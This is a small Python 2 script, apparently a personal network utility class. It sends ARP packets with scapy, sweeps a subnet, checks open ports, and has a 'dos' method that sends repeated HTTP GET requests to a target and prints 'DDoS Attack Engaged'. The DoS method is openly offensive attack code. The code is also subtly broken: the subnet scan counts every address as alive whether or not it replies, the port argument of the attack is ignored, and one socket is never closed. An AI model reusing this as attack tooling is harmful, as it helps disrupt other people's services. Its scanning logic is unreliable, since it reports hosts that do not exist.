#!/bin/python

"""
class dari awangga network util
"""
from scapy.all import ARP,Ether,sendp
from socket import *

class Anu(object):
	def sendArp(self,mac_rec,ip_rec,ip_target):	
		try:
			paket = Ether()/ARP(op="who-has",hwsrc=mac_rec,psrc=ip_rec,pdst=ip_target)
 			sendp(paket)
			return True
		except AttributeError:
			return False
	def scanNet(self,net_add,begin,end):
		net = net_add[:-1]
		result = ''
		total = 0
		for num in range(begin,end):
			ip = net+str(num)
			cek = self.sendArp('00:00:00:00:00:00','169.254.254.254',ip)
			if cek:
				result=result+ip+' , '
				total += 1
		return str(total)+' Alive Node: '+result
	def isOpen(self,ipadd,port):
		s=socket(AF_INET, SOCK_STREAM)
		s.settimeout(3)
		if (s.connect_ex((ipadd,port))==0):
			return True
		else:
			return False
		s.close()
	def dos(self,host,port,message):
		ip = gethostbyname( host )
		ddos = socket(AF_INET, SOCK_STREAM)
		try:
			ddos.connect((host, 80))
			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
			ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
		except socket.error, msg:
			print("|[Connection Failed]         |")
		print ( "|[DDoS Attack Engaged]       |")
		ddos.close()		
